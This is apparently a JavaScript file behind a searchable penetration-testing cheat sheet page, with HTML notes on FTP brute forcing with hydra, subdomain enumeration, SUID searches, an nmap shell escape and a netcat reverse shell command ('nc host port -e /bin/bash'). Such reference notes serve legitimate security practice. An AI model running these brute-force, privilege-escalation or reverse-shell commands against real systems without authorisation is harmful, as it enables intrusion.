// Sample JSON data for the cheat sheet with header, notes, and description
const mynotes = [
    {
      "header": "FTP pentesting",
      "notes": "<h4>Banner Grabbing</h4><code>nmap -sV -A -p21 IP_ADD</code> -A  :- aggressive scan<br><code>nmap -sV -sC -p21 IP_ADD</code> :- default scripts <h4>Anonymous Login</h4><code>username:anonymous\n password:--- (empty or anonymous)</code><h4>Brute force</h4>1. automated - nmap scripts<br><code>locate /nmap/scripts | grep ftp-</code> <br> 2. manual - hydra <br> <code>hydra -l username -p password ftp://IPV4/..<br>hydra -L username.txt -P pass.txt ftp://IPV4/...</code> <h4>Browser connection</h4><code>ftp://anonymous:anonymous@IP</code><br> downloading file <br> <code> wget -m ftp://anonymous:anonymous@IP</code> <h4>Post Exploitation</h4> some dangerous settings <br> <code> anonymous_enable=YES <br> anon_upload_enable=YES <br> anon_mkdir_write_enable=YES <br>  anon_root=/home/username/ftp <br>chown_uploads=YES <br> chown_username=username <br> local_enable=YES<br> no_anon_password=YES <br> write_enable=YES </code> <br> .",
      "description": "ftp, enum , pentest"
    },
    {
        "header": "setup.py install",
        "notes": "<code>python setup.py install<br> python3 setup.py install</code>",
        "description": "setup.py, install"
    },
    {
        "header": "install requirements.txt",
        "notes": "<code>pip install -r requirements.txt<br>pip3 install -r requirements.txt</code><br>",
        "description": "requirements.txt, install"
    },
    {
        "header": "Convert md5 hashing",
        "notes": "<h4>convert to md5</h4> <code>for word in $(cat wordlist.txt); do echo -n \"$word\" | md5sum | awk '{print $1}' >> md5.txt; done<code>",
        "description": "md5, hashing, convert"
    },
    {
        "header": "gobuster subdomain enum",
        "notes": "<h4>bruteforce</h4><code>gobuster dns -d example.com -w word_list.txt</code><br><code>gobuster dns -d example.com -w word_list.txt-i</code> <br><br><p>i - ip address</p>",
        "description": "gobuster, subdomain, enum"
    },
    {
        "header": "subdomain enum",
        "notes": "<h4>gobuster</h4><code>gobuster dns -d example.com -w word_list.txt</code><br><h4>subbrute</h4><code>python3 subbrute.py -p example.com -c 16</code><br><p>-p : optional (DNS records)<br>-c : threads (max 16)</p><br> <h4>subfinder</h4><code>subfinder -d example.com</code><br><h4>assetfinder</h4><code>assetfinder --subs-only example.com</code><br><br>",
        "description": "subdomain, enum"
    },
    {
        "header": "privilege escalation",
        "notes": "<h4>nmap privilege escalation</h4><code>nmap --interactive</code><br><code>nmap>!sh</code> <br><br>",
        "description": "nmap, privilege, escalation "
    },
    {
        "header": "privilege escalation find SUID files",
        "notes": "<h4>find SUID (find command for get privilege)</h4><code>find / -perm -u=s -type f 2>/dev/null</code> <br><br><code>find / -perm -g=s -type f 2>/dev/null</code><br><br><code>find / -perm -g=s -o -perm -u=s -type f 2>/dev/null</code><br><br><code>find /home -writable -type d 2>/dev/null</code><br><br><code>find . -type f -perm 0777 -print</code><br><br>",
        "description": "privilege escalation, find ,suid ,super user"
    },
    {
        "header": "install .tar file in linux",
        "notes": "<h4>install .tar</h4><code>tar -xvf filename.tar</code><br><br>",
        "description": "install , tar , linux ,kali linux"
    },
    {
        "header": "Sort private bugbounty program",
        "notes": "<h4>sort private bugbounty</h4><code>inurl: /bugbounty insite:lk</code><br><br>",
        "description": "sort,private,bugbounty,google,dorks"
    },
    {
        "header": "upgrading pty with python",
        "notes": "<h4>python pty</h4><code>python -c 'import pty;pty.spawn('/bin/bash')'</code><br><br>",
        "description": "upgrading, tty, pty, putty"
    },
    {
        "header": "FTP bruteforce with hydra",
        "notes": "<h4>ftp bruteforce</h4><code>hydra -l uname -P rockyou.txt ftp://10.10.9.10</code><br><br>",
        "description": "hydra, ftp, bruteforce"
    },
    {
        "header": "filter wordlist, sorting wordlist",
        "notes": "<h4>ftp bruteforce</h4><code>grep -E '^.{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br><code>grep -E '^[[:alnum:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br><code>grep -E '^[[:alpha:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br><code>grep -E '^[[:upper:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br><code>grep -E '^[[:lower:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br><code>grep -E '^[[:digit:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br>",
        "description": "filter, sorting, wordlist, rockyou, grep -E"
    },
    {
        "header": "Python HTTP server",
        "notes": "<h4>start python http server</h4><code>python -m http.server port_num</code><br><br>",
        "description": "python, http, server"
    },
    {
        "header": "Connect with SSH key",
        "notes": "<h4>connect with ssh</h4><code>chmod id_rsa 600</code><br><br><code>ssh user@<ip_add> -i id_rsa</code>",
        "description": "connect, ssh, sshkey, id_rsa,rce, reverse shell"
    },
    {
        "header": "Netcat remote access",
        "notes": "<h4>netcat</h4><code>nc  host  port  -e  /bin/bash</code><br><br>",
        "description": "netcat, remote, access, /bin/bash , shell"
    },
    {
        "header": "Netcat remote access",
        "notes": "<h4>netcat</h4><code>nc  host  port  -e  /bin/bash</code><br><br>",
        "description": "netcat, remote, access, /bin/bash , shell"
    },
    {
        "header": "Netcat remote access",
        "notes": "<h4>Subdomain Enum</h4><code>amass enum -d example.com</code><br><br><code>amass enum -d example.com -o output.txt -rf resolvers.txt -brute</code><br><br><code>subfinder -d example.com</code><br><br><code>gobuster dns -d example.com -w /path/to/wordlist.txt -t 50</code><br><br><code>censys subdomain example.com</code><br><br><code>assetfinder --subs-only example.com</code><br><br><code>findomain -t example.com</code><br><br><code>knockpy example.com</code><br><br>",
        "description": "subdomain, enum, takeover, information, gathering"
    },
    // Add more data here...
  ];
  
  // Function to split the search input into individual keywords
  function getKeywords() {
    const input = document.getElementById("search").value;
    return input.toLowerCase().split(",").map(keyword => keyword.trim());
  }
  
  // Function to check if a description contains all the keywords
  function descriptionContainsKeywords(description, keywords) {
    return keywords.every(keyword => description.includes(keyword));
  }
  
  // Function to search the cheat sheet and display results as cards
  function searchCheatSheet() {
    const keywords = getKeywords();
    const resultsContainer = document.getElementById("resultsContainer");
    resultsContainer.innerHTML = "";
  
    // Sort the data by description
    mynotes.sort((a, b) => a.description.localeCompare(b.description));
  
    for (const item of mynotes) {
      const header = item.header;
      const notes = item.notes;
      const description = item.description.toLowerCase();
  
      if (descriptionContainsKeywords(description, keywords)) {
        // Create a result card for each matching item
        const resultCard = document.createElement("div");
        resultCard.classList.add("result-card");
  
        const headerElement = document.createElement("h2");
        headerElement.innerText = header;
  
        const notesElement = document.createElement("p");
        // Use innerHTML to render HTML content in notes
        notesElement.innerHTML = notes;
  
        const desElement = document.createElement("h3");
        desElement.innerText = description;
  
        // Append elements to the result card
        resultCard.appendChild(headerElement);
        resultCard.appendChild(notesElement);
        resultCard.appendChild(desElement);
  
        // Append the result card to the results container
        resultsContainer.appendChild(resultCard);
      }
    }
  
    // Display a message if no results were found
    if (resultsContainer.children.length === 0) {
      resultsContainer.innerText = "No results found.";
    }
  }
  
  // Initial population of the result cards
  searchCheatSheet();
  
  // Add an event listener to the search input for auto-search
  const searchInput = document.getElementById("search");
  searchInput.addEventListener("input", searchCheatSheet);
  
